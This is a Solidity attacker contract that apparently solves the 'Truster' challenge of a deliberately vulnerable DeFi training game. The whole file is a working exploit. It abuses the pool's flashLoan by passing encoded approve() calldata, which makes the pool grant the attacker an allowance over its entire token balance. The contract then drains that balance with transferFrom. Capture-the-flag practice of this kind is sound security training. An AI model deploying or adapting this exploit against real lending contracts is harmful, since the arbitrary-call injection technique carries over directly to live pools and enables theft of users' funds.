// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {TrusterLenderPool} from "./TrusterLenderPool.sol";

import "hardhat/console.sol";

contract AttackerContract {
    TrusterLenderPool private immutable pool;
    IERC20 private immutable dvt;

    constructor(address _pool, address _dvt) {
        pool = TrusterLenderPool(_pool);
        dvt = IERC20(_dvt);
    }

    ///@dev Attack TrusterLender contract
    ///@param _recepient: Address to receive stolen tokens

    function attack(address _recepient) external {
        ///@dev Create poolAddr from pool instance
        address poolAddr = address(pool);

        ///@dev Get pool balance
        uint256 poolBalance = dvt.balanceOf(poolAddr);

        ///@dev Excute flash loan function on external contract.
        pool.flashLoan(
            0,
            address(this),
            address(dvt),
            ///@dev Send approve signature along with its args as calldata
            abi.encodeWithSignature(
                "approve(address,uint256)",
                _recepient,
                poolBalance
            )
        );

        console.log(dvt.allowance(poolAddr, _recepient), "Allowance");
        console.log(poolBalance, "Balance");

        ///@dev Send DVT tokens from pool contract to recepient address
        dvt.transferFrom(poolAddr, _recepient, poolBalance - 10);

        console.log(dvt.allowance(poolAddr, _recepient), "Allowance");
    }
}
